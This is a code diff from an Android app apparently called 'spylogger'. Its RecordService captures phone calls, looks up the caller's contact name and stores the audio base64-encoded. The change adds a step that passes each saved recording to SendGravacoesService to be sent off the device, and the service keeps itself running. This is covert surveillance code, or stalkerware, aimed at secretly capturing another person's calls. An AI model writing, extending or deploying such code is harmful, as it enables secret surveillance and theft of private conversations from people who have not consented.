@@ -11,7 +11,6 @@ import android.telephony.PhoneStateListener;
 import android.telephony.TelephonyManager;
 import android.util.Log;
 
-import com.gmailsender.Utils;
 import com.gravatasufoca.spylogger.helpers.MediaRecorderHelper;
 import com.gravatasufoca.spylogger.model.Ligacao;
 import com.gravatasufoca.spylogger.model.TipoMensagem;
@@ -20,6 +19,7 @@ import com.gravatasufoca.spylogger.repositorio.RepositorioGravacao;
 import com.gravatasufoca.spylogger.repositorio.RepositorioTopico;
 import com.gravatasufoca.spylogger.repositorio.impl.RepositorioGravacaoImpl;
 import com.gravatasufoca.spylogger.repositorio.impl.RepositorioTopicoImpl;
+import com.gravatasufoca.spylogger.utils.Utils;
 import com.utilidades.gravata.utils.Utilidades;
 
 import java.io.IOException;
@@ -107,7 +107,7 @@ public class RecordService extends Service{
 						Ligacao ligacao=new Ligacao();
 						ligacao.setRemetente(remetente);
 						ligacao.setData(new Date());
-						ligacao.setAudio(Utils.getBytes(mediaRecorderHelper.getRecordedFile()));
+						ligacao.setAudio(Utils.encodeBase64(mediaRecorderHelper.getRecordedFile()));
 						ligacao.setNumero(phoneNumber);
 						ligacao.setNome(com.gravatasufoca.spylogger.utils.Utils.getContactDisplayNameByNumber(phoneNumber,getApplicationContext().getContentResolver()));
 						ligacao.setDuracao(mediaRecorderHelper.getDuration());
@@ -117,13 +117,17 @@ public class RecordService extends Service{
 							topico = new Topico.TopicoBuilder()
 									.setNome(ligacao.getNome())
 									.setIdReferencia(ligacao.getNumero())
+									.setGrupo(false)
 									.build(TipoMensagem.AUDIO);
 
 							repositorioTopico.inserir(topico);
 						}
 						ligacao.setTopico(topico);
 						repositorioGravacao.inserir(ligacao);
-					} catch (IOException | SQLException e) {
+
+						SendGravacoesService sendGravacoesService=new SendGravacoesService(getApplicationContext(),null);
+						sendGravacoesService.enviarTopicos();
+					} catch (SQLException e) {
 						e.printStackTrace();
 					}
 
@@ -167,7 +171,7 @@ public class RecordService extends Service{
 
 	@Override
 	public int onStartCommand(Intent intent, int flags, int startId) {
-		//super.onStart(intent, startId);
+//		super.onStart(intent, startId);
 
 		Utilidades.verifyPremium(this);
 		return START_STICKY;
